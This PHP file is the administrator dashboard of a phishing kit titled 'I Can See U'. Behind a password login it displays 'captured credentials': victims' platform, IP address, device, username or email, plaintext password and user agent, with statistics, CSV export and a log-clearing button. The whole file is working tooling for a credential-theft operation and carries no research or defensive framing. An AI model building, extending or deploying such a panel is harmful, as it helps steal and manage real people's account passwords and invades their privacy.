<?php
/**
 * Admin Dashboard
 * View and manage captured credentials
 */

require_once 'utils.php';

// Handle login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_password'])) {
    $password = $_POST['admin_password'] ?? '';
    if (verifyAdminPassword($password)) {
        $_SESSION['admin'] = true;
        $_SESSION['admin_login_time'] = time();
    } else {
        $loginError = 'Invalid password!';
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    unset($_SESSION['admin']);
    unset($_SESSION['admin_login_time']);
    header('Location: admin.php');
    exit;
}

// Handle CSV export
if (isset($_GET['export']) && isAdmin()) {
    exportToCSV();
    exit;
}

// Handle clear logs
if (isset($_GET['clear']) && isAdmin() && isset($_GET['confirm'])) {
    file_put_contents(LOG_FILE, '');
    header('Location: admin.php');
    exit;
}

$loginError = $loginError ?? null;
$stats = isAdmin() ? getStatistics() : null;
$entries = isAdmin() ? getLogEntries(50) : null;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - I Can See U</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0f1e;
            color: #e0e0e0;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #1a1a2e;
        }

        h1 {
            color: #00d4ff;
            font-size: 28px;
        }

        .header-actions {
            display: flex;
            gap: 10px;
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: #00d4ff;
            color: #0f0f1e;
            font-weight: bold;
        }

        .btn-primary:hover {
            background: #00a8cc;
        }

        .btn-danger {
            background: #ff4444;
            color: white;
        }

        .btn-danger:hover {
            background: #cc0000;
        }

        .login-section {
            max-width: 400px;
            margin: 50px auto;
            background: #1a1a2e;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
        }

        .login-section h2 {
            margin-bottom: 20px;
            color: #00d4ff;
            text-align: center;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #b0b0b0;
        }

        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #333;
            background: #0f0f1e;
            color: #e0e0e0;
            border-radius: 5px;
            font-size: 14px;
        }

        input[type="password"]:focus,
        input[type="text"]:focus {
            outline: none;
            border-color: #00d4ff;
            box-shadow: 0 0 10px rgba(0, 212, 255, 0.3);
        }

        .error {
            color: #ff4444;
            padding: 10px;
            background: rgba(255, 68, 68, 0.1);
            border-radius: 5px;
            margin-bottom: 20px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: #1a1a2e;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border-left: 4px solid #00d4ff;
        }

        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #00d4ff;
            margin-bottom: 5px;
        }

        .stat-label {
            color: #b0b0b0;
            font-size: 14px;
        }

        .table-section {
            background: #1a1a2e;
            border-radius: 10px;
            padding: 20px;
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }

        th {
            background: #0f0f1e;
            color: #00d4ff;
            padding: 12px;
            text-align: left;
            font-weight: bold;
            border-bottom: 2px solid #333;
        }

        td {
            padding: 12px;
            border-bottom: 1px solid #333;
            font-size: 13px;
        }

        tr:hover {
            background: #242438;
        }

        .platform-badge {
            display: inline-block;
            padding: 4px 8px;
            background: rgba(0, 212, 255, 0.2);
            color: #00d4ff;
            border-radius: 3px;
            font-size: 12px;
            font-weight: bold;
        }

        .device-badge {
            display: inline-block;
            padding: 4px 8px;
            background: rgba(100, 200, 255, 0.2);
            color: #64c8ff;
            border-radius: 3px;
            font-size: 12px;
        }

        .section-title {
            color: #00d4ff;
            font-size: 20px;
            margin-top: 30px;
            margin-bottom: 20px;
            border-bottom: 2px solid #1a1a2e;
            padding-bottom: 10px;
        }

        .breakdown {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .breakdown-card {
            background: #0f0f1e;
            padding: 15px;
            border-radius: 5px;
            border-left: 3px solid #00d4ff;
        }

        .breakdown-card h3 {
            color: #00d4ff;
            font-size: 14px;
            margin-bottom: 10px;
        }

        .breakdown-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #2a2a3e;
            font-size: 13px;
        }

        .breakdown-item:last-child {
            border-bottom: none;
        }

        .count {
            color: #00d4ff;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <?php if (!isAdmin()): ?>
            <div class="login-section">
                <h2>🔐 Admin Panel</h2>
                <?php if ($loginError): ?>
                    <div class="error"><?php echo $loginError; ?></div>
                <?php endif; ?>
                <form method="POST">
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="admin_password" required autofocus>
                    </div>
                    <button type="submit" class="btn btn-primary" style="width: 100%;">Login</button>
                </form>
            </div>
        <?php else: ?>
            <header>
                <div>
                    <h1>📊 Admin Dashboard</h1>
                    <p style="color: #b0b0b0; margin-top: 5px;">Captured Credentials Monitor</p>
                </div>
                <div class="header-actions">
                    <a href="?export" class="btn btn-primary">📥 Export CSV</a>
                    <a href="?clear" onclick="return confirm('Clear all logs? This cannot be undone!');" class="btn btn-danger">🗑️ Clear Logs</a>
                    <a href="?logout" class="btn btn-primary">🚪 Logout</a>
                </div>
            </header>

            <!-- Statistics -->
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-value"><?php echo $stats['total_captures']; ?></div>
                    <div class="stat-label">Total Captures</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value"><?php echo count($stats['platforms']); ?></div>
                    <div class="stat-label">Platforms</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value"><?php echo count($stats['ips']); ?></div>
                    <div class="stat-label">Unique IPs</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value"><?php echo count($stats['devices']); ?></div>
                    <div class="stat-label">Device Types</div>
                </div>
            </div>

            <!-- Breakdown -->
            <div class="breakdown">
                <div class="breakdown-card">
                    <h3>📱 By Platform</h3>
                    <?php foreach ($stats['platforms'] as $platform => $count): ?>
                        <div class="breakdown-item">
                            <span><?php echo $platform; ?></span>
                            <span class="count"><?php echo $count; ?></span>
                        </div>
                    <?php endforeach; ?>
                </div>

                <div class="breakdown-card">
                    <h3>💻 By Device</h3>
                    <?php foreach ($stats['devices'] as $device => $count): ?>
                        <div class="breakdown-item">
                            <span><?php echo $device; ?></span>
                            <span class="count"><?php echo $count; ?></span>
                        </div>
                    <?php endforeach; ?>
                </div>

                <div class="breakdown-card">
                    <h3>🌐 Top IPs (Top 5)</h3>
                    <?php $topIps = array_slice($stats['ips'], 0, 5);
                    foreach ($topIps as $ip => $count): ?>
                        <div class="breakdown-item">
                            <span><?php echo $ip; ?></span>
                            <span class="count"><?php echo $count; ?></span>
                        </div>
                    <?php endforeach; ?>
                </div>
            </div>

            <!-- Recent Captures -->
            <div class="section-title">📋 Recent Captures (Last 50)</div>
            <div class="table-section">
                <?php if (count($entries) > 0): ?>
                    <table>
                        <thead>
                            <tr>
                                <th>Timestamp</th>
                                <th>Platform</th>
                                <th>IP Address</th>
                                <th>Device</th>
                                <th>Email/Username</th>
                                <th>Password</th>
                                <th>User Agent</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($entries as $line): ?>
                                <?php 
                                $data = parseLogLine($line);
                                if ($data):
                                ?>
                                    <tr>
                                        <td><?php echo htmlspecialchars($data['timestamp']); ?></td>
                                        <td><span class="platform-badge"><?php echo htmlspecialchars($data['platform']); ?></span></td>
                                        <td><?php echo htmlspecialchars($data['ip']); ?></td>
                                        <td><span class="device-badge"><?php echo htmlspecialchars($data['device']); ?></span></td>
                                        <td><?php echo htmlspecialchars($data['credential']); ?></td>
                                        <td><?php echo htmlspecialchars($data['password']); ?></td>
                                        <td style="max-width: 250px; overflow: hidden; text-overflow: ellipsis;"><?php echo htmlspecialchars(substr($data['userAgent'], 0, 80)); ?></td>
                                    </tr>
                                <?php endif; ?>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                <?php else: ?>
                    <p style="text-align: center; color: #b0b0b0; padding: 20px;">No captures yet. 👻</p>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>
